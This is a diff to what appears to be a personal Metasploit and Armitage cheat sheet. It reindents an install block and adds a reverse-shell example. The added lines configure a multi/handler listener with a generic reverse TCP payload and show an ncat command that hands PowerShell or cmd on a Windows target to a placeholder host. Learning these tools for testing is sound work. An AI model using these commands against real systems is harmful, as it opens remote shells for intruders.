@@ -13,10 +13,12 @@
 -   msf: CLI based metasploit framework (Kali Linux default program)
 -   Armitage: Java-based GUI front-end for the metasploit framework
 
-```sh
-sudo apt install armitage
+    ```sh
+    # metasploit (mfsconsole): Kali Linux default
+    # Armitage: need install
+    sudo apt install armitage
 
-```
+    ```
 
 <h4> Modules</h4>
 
@@ -63,6 +65,18 @@ exit
 # search specific exploits matching keywords
 search type:exploit platform:windows flash
 search mysql
+
+# reverse shell connection example
+use exploit/multi/handler
+show options
+set PAYLOAD generic/shell_reverse_tcp
+set LHOST xx.xx.xx.xx
+set LPORT pppp
+show options
+exploit
+
+# if the target is a Windows machine
+>> ncat -nv xx.xx.xx.xx pppp -e powershell or cmd
 
 
 ```
